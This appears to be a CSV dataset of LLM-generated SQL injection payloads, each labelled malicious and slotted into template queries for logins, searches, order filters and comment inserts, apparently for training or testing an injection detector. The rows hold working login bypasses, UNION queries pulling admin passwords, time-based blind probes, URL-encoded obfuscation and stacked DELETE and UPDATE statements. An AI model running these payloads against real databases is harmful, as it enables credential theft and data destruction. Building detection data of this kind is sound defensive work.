attack_category,template_context,payload,full_query,label,source,generator_model,round
encoding_obfuscation,user_lookup,"0x31'%20AND%20SUBSTR(password,1,1)%3D'0'--","SELECT * FROM users WHERE id = 0x31'%20AND%20SUBSTR(password,1,1)%3D'0'--",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,order_filter,";WAITFOR DELAY '0:0:10'--""","SELECT * FROM orders WHERE status = ';WAITFOR DELAY '0:0:10'--""' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,order_filter,"OR+'a'='a'+UNION+SELECT+password+FROM+admin--""","SELECT * FROM orders WHERE status = 'OR+'a'='a'+UNION+SELECT+password+FROM+admin--""' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,order_filter,%27%20OR%20CHAR(80)%3D'P'/*,SELECT * FROM orders WHERE status = '%27%20OR%20CHAR(80)%3D'P'/*' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,order_filter,"%27)%20UNION%20ALL%20SELECT%20CONCAT(username,%20'%20',%20password)%20FROM%20admin--","SELECT * FROM orders WHERE status = '%27)%20UNION%20ALL%20SELECT%20CONCAT(username,%20'%20',%20password)%20FROM%20admin--' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,order_filter,/*--%20UNION%2bSELECT%2bdatabase()%2c%2bschema()%2c%2btable_name()%2c%2bcolumn_name()%2bFROM%2binformation_schema.*%2bWHERE%2btable_type%2b=%2b'TABLE'*/,SELECT * FROM orders WHERE status = '/*--%20UNION%2bSELECT%2bdatabase()%2c%2bschema()%2c%2btable_name()%2c%2bcolumn_name()%2bFROM%2binformation_schema.*%2bWHERE%2btable_type%2b=%2b'TABLE'*/' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,comment_insert,"--%3E%0D%0A1'%20and%20(SELECT%20DBMS_PIPE.RECEIVE_MESSAGE(%20CHR(66)%20||CHR(67)%20||CHR(79)%20||CHR(101),5))--","INSERT INTO comments (user_id, body) VALUES (1, '--%3E%0D%0A1'%20and%20(SELECT%20DBMS_PIPE.RECEIVE_MESSAGE(%20CHR(66)%20||CHR(67)%20||CHR(79)%20||CHR(101),5))--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,comment_insert,"<!--1';%20INSERT%20INTO%20dual%20(SELECT%20CHR((ASCII(substring(current_user,1,1))+1))),NULL--","INSERT INTO comments (user_id, body) VALUES (1, '<!--1';%20INSERT%20INTO%20dual%20(SELECT%20CHR((ASCII(substring(current_user,1,1))+1))),NULL--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,comment_insert,%0D%0A1'%20OR%20CAST(NULL%20AS%20VARCHAR2)%20=%20DBMS_UTILITY.SQLID_TO_SQLHASH(CAST('bcpjqq2%20select%20(case%20when%20(4747=4747)%20then%201%20else%200%20end)%20from%20dual%20qqzvxq' AS VARCHAR2))%20--,"INSERT INTO comments (user_id, body) VALUES (1, '%0D%0A1'%20OR%20CAST(NULL%20AS%20VARCHAR2)%20=%20DBMS_UTILITY.SQLID_TO_SQLHASH(CAST('bcpjqq2%20select%20(case%20when%20(4747=4747)%20then%201%20else%200%20end)%20from%20dual%20qqzvxq' AS VARCHAR2))%20--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,comment_insert,"%0D%0A1';%20WAITFOR%20DELAY%20'0:0:5'%20AND%20(select%20case%20when%20(1=1)%20then%20sys.fn_varbintohexstr(hashbytes('md5',current_timestamp))%20else%20null%20end)%20--","INSERT INTO comments (user_id, body) VALUES (1, '%0D%0A1';%20WAITFOR%20DELAY%20'0:0:5'%20AND%20(select%20case%20when%20(1=1)%20then%20sys.fn_varbintohexstr(hashbytes('md5',current_timestamp))%20else%20null%20end)%20--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,comment_insert,%20or%20(select%20count(*)%20from%20users%20where%20username='admin'))--,"INSERT INTO comments (user_id, body) VALUES (1, '%20or%20(select%20count(*)%20from%20users%20where%20username='admin'))--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,comment_insert,%20waitfor%20delay%20'0:0:10'%20and%20exists(select%20*%20from%20products%20where%20product_name='Injection'),"INSERT INTO comments (user_id, body) VALUES (1, '%20waitfor%20delay%20'0:0:10'%20and%20exists(select%20*%20from%20products%20where%20product_name='Injection')')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,comment_insert,--%3E%0D%0A1'%20UNION%20SELECT%20CHAR(65)%2BCHAR(66)%2BCHAR(67)%2BCHAR(68)%2BCHAR(69)%2BCHAR(70)%2BCHAR(71)%2BCHAR(72)%2BCHAR(73)%2BCHAR(74)%2BCHAR(75)%2BCHAR(76)%2BCHAR(77)%2BCHAR(78)%2BCHAR(79)%2BCHAR(80)%2BCHAR(81)%2BCHAR(82)%2BCHAR(83)%2BCHAR(84)%2BCHAR(85)%2BCHAR(86)%2BCHAR(87)%2BCHAR(88)%2BCHAR(89)%2BCHAR(90),"INSERT INTO comments (user_id, body) VALUES (1, '--%3E%0D%0A1'%20UNION%20SELECT%20CHAR(65)%2BCHAR(66)%2BCHAR(67)%2BCHAR(68)%2BCHAR(69)%2BCHAR(70)%2BCHAR(71)%2BCHAR(72)%2BCHAR(73)%2BCHAR(74)%2BCHAR(75)%2BCHAR(76)%2BCHAR(77)%2BCHAR(78)%2BCHAR(79)%2BCHAR(80)%2BCHAR(81)%2BCHAR(82)%2BCHAR(83)%2BCHAR(84)%2BCHAR(85)%2BCHAR(86)%2BCHAR(87)%2BCHAR(88)%2BCHAR(89)%2BCHAR(90)')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,comment_insert,<!--1';%20UPDATE%20comments%20SET%20body='%22%22--%20WHERE%20user_id=%27',"INSERT INTO comments (user_id, body) VALUES (1, '<!--1';%20UPDATE%20comments%20SET%20body='%22%22--%20WHERE%20user_id=%27'')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,comment_insert,%0D%0A1'%20OR%20EXISTS(SELECT%20*%20FROM%20information_schema.tables%20WHERE%20table_name=%22users%22%20AND%20table_schema=%22public%22),"INSERT INTO comments (user_id, body) VALUES (1, '%0D%0A1'%20OR%20EXISTS(SELECT%20*%20FROM%20information_schema.tables%20WHERE%20table_name=%22users%22%20AND%20table_schema=%22public%22)')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,comment_insert,/*1';%20CREATE%20TABLE%20test_table(a%20varchar(100));*/,"INSERT INTO comments (user_id, body) VALUES (1, '/*1';%20CREATE%20TABLE%20test_table(a%20varchar(100));*/')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,comment_insert,<!--1';%20DELETE%20FROM%20comments%20WHERE%20body LIKE '%--%0D%0A',"INSERT INTO comments (user_id, body) VALUES (1, '<!--1';%20DELETE%20FROM%20comments%20WHERE%20body LIKE '%--%0D%0A'')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,login,"' OR '1'='1' AND ((SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'admin') = 'a') --","SELECT * FROM users WHERE username = '' OR '1'='1' AND ((SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'admin') = 'a') --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,login,5000  =  dbms_scheduler.get_job_state   (   (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5000  =  5000  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'admin' like '%,SELECT * FROM users WHERE username = '5000  =  dbms_scheduler.get_job_state   (   (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5000  =  5000  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'admin' like '%' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,login,-1' OR EXISTS(SELECT * FROM users WHERE username LIKE '%admin%' AND password LIKE '%admin%'),SELECT * FROM users WHERE username = '-1' OR EXISTS(SELECT * FROM users WHERE username LIKE '%admin%' AND password LIKE '%admin%')' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,login,' OR 1=(SELECT (SELECT COUNT(*)) FROM (SELECT 1) AS t) --,SELECT * FROM users WHERE username = '' OR 1=(SELECT (SELECT COUNT(*)) FROM (SELECT 1) AS t) --' AND password = 'anything',1,llm_generated,gemini-3-flash-preview,2
nested_injection,login,"admin' AND (SELECT 1 FROM (SELECT(IF(1=1,BENCHMARK(2000000,SHA1(1)),0)))x) AND '1'='1","SELECT * FROM users WHERE username = 'admin' AND (SELECT 1 FROM (SELECT(IF(1=1,BENCHMARK(2000000,SHA1(1)),0)))x) AND '1'='1' AND password = 'anything'",1,llm_generated,gemini-3-flash-preview,2
nested_injection,login,' OR (SELECT 1 FROM (SELECT (SELECT (SELECT 'a'))) AS t)='a,SELECT * FROM users WHERE username = '' OR (SELECT 1 FROM (SELECT (SELECT (SELECT 'a'))) AS t)='a' AND password = 'anything',1,llm_generated,gemini-3-flash-preview,2
nested_injection,login,' OR (SELECT CASE WHEN (1=1) THEN (SELECT '1') ELSE (SELECT '0') END)='1,SELECT * FROM users WHERE username = '' OR (SELECT CASE WHEN (1=1) THEN (SELECT '1') ELSE (SELECT '0') END)='1' AND password = 'anything',1,llm_generated,gemini-3-flash-preview,2
nested_injection,login,' OR EXISTS(SELECT 1 FROM (SELECT 1) AS t1 WHERE EXISTS(SELECT 1 FROM (SELECT 1) AS t2)) --,SELECT * FROM users WHERE username = '' OR EXISTS(SELECT 1 FROM (SELECT 1) AS t1 WHERE EXISTS(SELECT 1 FROM (SELECT 1) AS t2)) --' AND password = 'anything',1,llm_generated,gemini-3-flash-preview,2
nested_injection,login,1' AND (SELECT COUNT(*) FROM (SELECT * FROM (SELECT * FROM users LIMIT 2) AS t1 JOIN (SELECT * FROM users LIMIT 3) AS t2 UNION ALL SELECT NULL FROM users) AS t3) --,SELECT * FROM users WHERE username = '1' AND (SELECT COUNT(*) FROM (SELECT * FROM (SELECT * FROM users LIMIT 2) AS t1 JOIN (SELECT * FROM users LIMIT 3) AS t2 UNION ALL SELECT NULL FROM users) AS t3) --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,login,"(SELECT DBMS_PIPE.RECEIVE_MESSAGE('BAS', 5) FROM DUAL) AND ('%' = '%","SELECT * FROM users WHERE username = '(SELECT DBMS_PIPE.RECEIVE_MESSAGE('BAS', 5) FROM DUAL) AND ('%' = '%' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,login,"-1' UNION ALL SELECT username, password FROM users WHERE username = 'admin' --","SELECT * FROM users WHERE username = '-1' UNION ALL SELECT username, password FROM users WHERE username = 'admin' --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,login,' OR (SELECT (CASE WHEN (1=1) THEN 'true' ELSE 'false' END) FROM (SELECT 1)) = 'true' --,SELECT * FROM users WHERE username = '' OR (SELECT (CASE WHEN (1=1) THEN 'true' ELSE 'false' END) FROM (SELECT 1)) = 'true' --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,search,' AND (SELECT 1 FROM (SELECT COUNT(*) FROM users)) > 0 --,SELECT * FROM products WHERE name LIKE '%' AND (SELECT 1 FROM (SELECT COUNT(*) FROM users)) > 0 --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,search,"' UNION ALL SELECT NULL, NULL, NULL, NULL FROM users --","SELECT * FROM products WHERE name LIKE '%' UNION ALL SELECT NULL, NULL, NULL, NULL FROM users --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,search,' OR EXISTS(SELECT 1 FROM (SELECT * FROM information_schema.tables WHERE table_name LIKE '%products%'))--,SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM (SELECT * FROM information_schema.tables WHERE table_name LIKE '%products%'))--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,search,' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '%admin%')) > 0--,SELECT * FROM products WHERE name LIKE '%' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '%admin%')) > 0--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,search,' OR (SELECT 1 FROM (SELECT * FROM orders WHERE order_date BETWEEN '2022-01-01' AND '2022-01-31'))--,SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM (SELECT * FROM orders WHERE order_date BETWEEN '2022-01-01' AND '2022-01-31'))--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,search,' AND (SELECT COUNT(*) FROM (SELECT * FROM categories WHERE category_id = (SELECT MIN(category_id) FROM categories))) > 0--,SELECT * FROM products WHERE name LIKE '%' AND (SELECT COUNT(*) FROM (SELECT * FROM categories WHERE category_id = (SELECT MIN(category_id) FROM categories))) > 0--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,search,' OR (SELECT 1 FROM (SELECT * FROM products WHERE price < (SELECT AVG(price) FROM products)))--,SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM (SELECT * FROM products WHERE price < (SELECT AVG(price) FROM products)))--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,search,"' OR IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))=65,'a','b')--","SELECT * FROM products WHERE name LIKE '%' OR IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))=65,'a','b')--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,search,' OR CAST((SELECT USER()) AS CHAR),SELECT * FROM products WHERE name LIKE '%' OR CAST((SELECT USER()) AS CHAR)%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,search,' OR (SELECT count(*) FROM products WHERE id=(SELECT min(id) FROM products)) --,SELECT * FROM products WHERE name LIKE '%' OR (SELECT count(*) FROM products WHERE id=(SELECT min(id) FROM products)) --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,search,' OR (SELECT pg_sleep(5)) --,SELECT * FROM products WHERE name LIKE '%' OR (SELECT pg_sleep(5)) --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,user_lookup,%' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '')--,SELECT * FROM users WHERE id = %' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '')--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,user_lookup,WAITFOR DELAY '0:0:5' AND (1=1),SELECT * FROM users WHERE id = WAITFOR DELAY '0:0:5' AND (1=1),1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,user_lookup,"UNION ALL SELECT NULL,NULL,NULL FROM information_schema.tables WHERE table_name LIKE 'users'","SELECT * FROM users WHERE id = UNION ALL SELECT NULL,NULL,NULL FROM information_schema.tables WHERE table_name LIKE 'users'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,order_filter,1' AND (SELECT COUNT(*) FROM users AS t1 JOIN transactions AS t2 ON t1.id = t2.user_id)--,SELECT * FROM orders WHERE status = '1' AND (SELECT COUNT(*) FROM users AS t1 JOIN transactions AS t2 ON t1.id = t2.user_id)--' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,order_filter,"1' OR (SELECT SUBSTRING(CAST(ASCII(SUBSTRING(password, 1, 1)) AS VARCHAR), 1, 1) LIKE '%a%'--","SELECT * FROM orders WHERE status = '1' OR (SELECT SUBSTRING(CAST(ASCII(SUBSTRING(password, 1, 1)) AS VARCHAR), 1, 1) LIKE '%a%'--' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,order_filter,1' AND LENGTH((SELECT username FROM admins WHERE id = 1)) > 0 --,SELECT * FROM orders WHERE status = '1' AND LENGTH((SELECT username FROM admins WHERE id = 1)) > 0 --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,order_filter,1' OR EXISTS(SELECT 1 FROM products WHERE price < 100) --,SELECT * FROM orders WHERE status = '1' OR EXISTS(SELECT 1 FROM products WHERE price < 100) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,order_filter,"1' AND (SELECT DATABASE()) IN ('information_schema', 'mysql') --","SELECT * FROM orders WHERE status = '1' AND (SELECT DATABASE()) IN ('information_schema', 'mysql') --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,order_filter,"1' UNION SELECT 1, user(), password FROM users --","SELECT * FROM orders WHERE status = '1' UNION SELECT 1, user(), password FROM users --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,order_filter,"1' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 1, 0) FROM users LIMIT 1) --","SELECT * FROM orders WHERE status = '1' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 1, 0) FROM users LIMIT 1) --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,order_filter,"1' AND (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users LIMIT 1) > 0 --","SELECT * FROM orders WHERE status = '1' AND (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users LIMIT 1) > 0 --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,order_filter,1' AND (SELECT COUNT(*) FROM users WHERE status='pending') != 0 --,SELECT * FROM orders WHERE status = '1' AND (SELECT COUNT(*) FROM users WHERE status='pending') != 0 --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,order_filter,1' AND 1=1 AND (SELECT 1 FROM (SELECT 1 FROM users UNION ALL SELECT 1 FROM orders)) --,SELECT * FROM orders WHERE status = '1' AND 1=1 AND (SELECT 1 FROM (SELECT 1 FROM users UNION ALL SELECT 1 FROM orders)) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,order_filter,1' OR EXISTS(SELECT 1 FROM (SELECT * FROM orders WHERE status LIKE '%pending%' UNION SELECT * FROM users WHERE username LIKE '%admin%'))#,SELECT * FROM orders WHERE status = '1' OR EXISTS(SELECT 1 FROM (SELECT * FROM orders WHERE status LIKE '%pending%' UNION SELECT * FROM users WHERE username LIKE '%admin%'))#' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,order_filter,1' AND (SELECT 1 FROM (SELECT * FROM orders WHERE order_id IN ((SELECT MAX(order_id) FROM orders)))) --,SELECT * FROM orders WHERE status = '1' AND (SELECT 1 FROM (SELECT * FROM orders WHERE order_id IN ((SELECT MAX(order_id) FROM orders)))) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,comment_insert,--' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '' OR 1=1)) --,"INSERT INTO comments (user_id, body) VALUES (1, '--' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '' OR 1=1)) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,comment_insert,' OR EXISTS(SELECT 1 FROM (SELECT * FROM posts WHERE content LIKE '%admin%')) --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM (SELECT * FROM posts WHERE content LIKE '%admin%')) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,comment_insert,(CASE WHEN (SELECT 1 FROM (SELECT * FROM config WHERE debug_mode = 'on')) THEN 1 ELSE 0 END) --,"INSERT INTO comments (user_id, body) VALUES (1, '(CASE WHEN (SELECT 1 FROM (SELECT * FROM config WHERE debug_mode = 'on')) THEN 1 ELSE 0 END) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,comment_insert,' OR (SELECT 1 FROM (SELECT * FROM logs WHERE error_code != ''))--,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT 1 FROM (SELECT * FROM logs WHERE error_code != ''))--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,comment_insert,"--' UNION SELECT user_id, body FROM comments WHERE user_id = (SELECT user_id FROM users WHERE username LIKE '%admin%')--","INSERT INTO comments (user_id, body) VALUES (1, '--' UNION SELECT user_id, body FROM comments WHERE user_id = (SELECT user_id FROM users WHERE username LIKE '%admin%')--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,comment_insert,' OR (SELECT 1 FROM (SELECT * FROM domains WHERE domain_name LIKE '%test%' AND (SELECT COUNT(*) FROM users WHERE active = 1)))--,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT 1 FROM (SELECT * FROM domains WHERE domain_name LIKE '%test%' AND (SELECT COUNT(*) FROM users WHERE active = 1)))--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,comment_insert,(CASE WHEN (SELECT 1 FROM (SELECT * FROM tables WHERE table_schema = 'public' AND column_name LIKE '%password%')) THEN 1 ELSE 0 END)--,"INSERT INTO comments (user_id, body) VALUES (1, '(CASE WHEN (SELECT 1 FROM (SELECT * FROM tables WHERE table_schema = 'public' AND column_name LIKE '%password%')) THEN 1 ELSE 0 END)--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,comment_insert,/*' OR EXISTS(SELECT 1 FROM (SELECT * FROM columns WHERE data_type = 'varchar' AND table_schema = 'private'))*/--,"INSERT INTO comments (user_id, body) VALUES (1, '/*' OR EXISTS(SELECT 1 FROM (SELECT * FROM columns WHERE data_type = 'varchar' AND table_schema = 'private'))*/--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,comment_insert,"' AND 1=1 UNION ALL SELECT schema_name, sequence_name FROM information_schema.sequences WHERE schema_name='test' /*","INSERT INTO comments (user_id, body) VALUES (1, '' AND 1=1 UNION ALL SELECT schema_name, sequence_name FROM information_schema.sequences WHERE schema_name='test' /*')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,comment_insert,--' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '' OR (SELECT 1 FROM (SELECT * FROM roles WHERE role_name LIKE '%admin%')))) --,"INSERT INTO comments (user_id, body) VALUES (1, '--' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '' OR (SELECT 1 FROM (SELECT * FROM roles WHERE role_name LIKE '%admin%')))) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,comment_insert,' OR EXISTS(SELECT 1 FROM (SELECT * FROM posts WHERE content LIKE '%delete%' AND (SELECT COUNT(*) FROM permissions WHERE permission_level <= 0))) --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM (SELECT * FROM posts WHERE content LIKE '%delete%' AND (SELECT COUNT(*) FROM permissions WHERE permission_level <= 0))) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,comment_insert,(CASE WHEN (SELECT 1 FROM (SELECT * FROM settings WHERE theme_name LIKE '%dark%' AND (SELECT COUNT(*) FROM events WHERE event_type LIKE '%login%' AND user_agent LIKE '%Chrome%'))) THEN 1 ELSE 0 END) --,"INSERT INTO comments (user_id, body) VALUES (1, '(CASE WHEN (SELECT 1 FROM (SELECT * FROM settings WHERE theme_name LIKE '%dark%' AND (SELECT COUNT(*) FROM events WHERE event_type LIKE '%login%' AND user_agent LIKE '%Chrome%'))) THEN 1 ELSE 0 END) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
